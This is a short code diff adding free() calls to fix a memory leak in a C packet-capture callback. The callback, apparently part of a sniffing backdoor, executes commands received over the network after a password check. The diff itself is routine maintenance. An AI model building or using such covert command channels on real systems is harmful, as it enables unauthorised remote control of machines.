@@ -128,11 +128,13 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
 		send_command(command);
+		free(command);
 		return;
 	}
 	else if (mode == CLIENT_MODE)
 	{
 		printf("%s", command);
+		free(command);
 		return;
 	}
 	else
@@ -140,9 +142,6 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "Incorrect Password\n");
 		return;
 	}
-
-
-
 }
 char * parse_cmd(char * data)
 {
